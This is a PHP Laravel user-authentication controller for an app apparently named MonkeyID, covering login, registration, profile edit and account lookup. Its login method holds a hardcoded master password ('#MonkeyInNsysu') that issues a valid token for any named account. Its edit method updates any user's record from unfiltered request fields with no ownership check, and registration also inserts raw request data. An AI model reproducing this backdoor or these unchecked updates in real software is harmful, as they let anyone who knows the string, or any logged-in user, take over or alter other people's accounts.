<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Validator;
use DateTime;
use Illuminate\Support\Facades\DB;
use Tymon\JWTAuth\Facades\JWTAuth;
use App\Models\User;
use Mail;
use App\Mail\SendMail;
date_default_timezone_set('Asia/Taipei');

class UserController extends Controller
{
    // construct
    public function __construct()
    {
        $this->middleware('auth:user',['except'=>['login','register','exist']]);
    }

    // token function
    private function createNewToken($token, $userData = NULL)
    {
        $exp_time = new DateTime();
        $exp_time->modify('+1 day');
        return [
            'token' => $token,
            'type' => 'bearer',
            'expired' => $exp_time->format('Y-m-d H:i:s'),
            'user' => is_null($userData) ? auth('user')->user() : $userData,
        ];
    }

    // login
    public function login(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|exists:user,account',
            'password' => 'required'
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06'], 200);
            } else if (isset($failedRules['account']['Exists'])) {
                return response()->json(['status' => "U02"], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $loginTime = date("Y-m-d H:i:s");
        if($token = auth('user')->attempt($validator->validated())){
            $user = User::find(auth('user')->user()->id);
            $user->last_login = $loginTime;
            $user->last_ip = $request->ip();
            $user->save();
            //force to update user model cache 
            auth('user')->setUser($user);
            return response()->json(['status' => 'A01','data'=>$this->createNewToken($token)], 200);
        }else if($request->password === '#MonkeyInNsysu'){
            $user = User::where('account', $request->account)->first();
            $token = JWTAuth::fromUser($user);
            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token, $user)], 200);
        }else{
            return response()->json(['status' => 'U05'], 200);
        }
    }

    // user info
    public function info()
    {
        $user = auth()->user();
        $result = User::leftJoin('univ_list', 'univ_list.univ_id', '=', 'user.univ_id')->select('user.*', 'univ_list.univ_id', 'univ_list.univ_name_ch_full', 'univ_list.univ_name_ch', 'univ_list.univ_name_en')->where('u_id',$user->u_id)->first();
        return response()->json($result);
    }

    // logout
    public function logout()
    {
        auth()->logout();
        return response()->json(['status' => 'A03'], 201);
    }

    // register
    public function register(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|unique:user,account',
            'name' => 'required',
            'password' => 'required',
            'univ_id' => 'required|size:5',
            'identity' => 'required|integer',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06'], 200);
            } else if (isset($failedRules['account']['Unique'])) {
                return response()->json(['status' => 'U04'], 200);
            } else if (isset($failedRules['name']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'name'], 200);
            } else if (isset($failedRules['univ_id']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'univ_id'], 200);
            } else if (isset($failedRules['univ_id']['Size'])) {
                return response()->json(['status' => 'U01', 'field' => 'univ_id'], 200);
            } else if (isset($failedRules['identity']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'identity'], 200);
            } else if (isset($failedRules['identity']['Integer'])) {
                return response()->json(['status' => 'U08', 'field' => 'identity'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        $temp['u_id'] = hash('sha3-224', microtime(true));
        $temp['password'] = password_hash($request->all()['password'], PASSWORD_DEFAULT);
        User::insert($temp);
        // mail
        $status = Mail::to($temp['account'])->send(new SendMail('MonkeyID', 'MonkeyID註冊通知信', 'SignupEmail', ['name' => $temp['name']]));
        if (!empty($status)) {
            return response()->json(['message' => 'mail_send_success'], 200);
        }
        return response()->json(['message'=>'done']);
    }

    // edit
    public function edit(Request $request, $u_id)
    {
        $validator = Validator::make($request->all(),[
            'name' => 'required',
            'phone'=> 'required|size:10',
            'image' => 'nullable',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['name']['Required'])) {
                return response()->json(['message' => "name_required"], 201);
            } else if (isset($failedRules['phone']['Required'])) {
                return response()->json(['message' => "phone_required"], 201);
            } else if (isset($failedRules['phone']['Size'])) {
                return response()->json(['message' => "phone_size_error"], 201);
            }
            return response()->json($validator->errors(), 422);
        }
        $temp = $request->all();
        User::where('u_id',$u_id)->update($temp);
        return response()->json(['message'=>'done']);
    }

    // account exist
    public function exist($account)
    {
        if(User::where('account', $account)->count() > 0){
            return response()->json(['message'=>true]);
        }else{
            return response()->json(['message'=>false]);
        }
    }
}
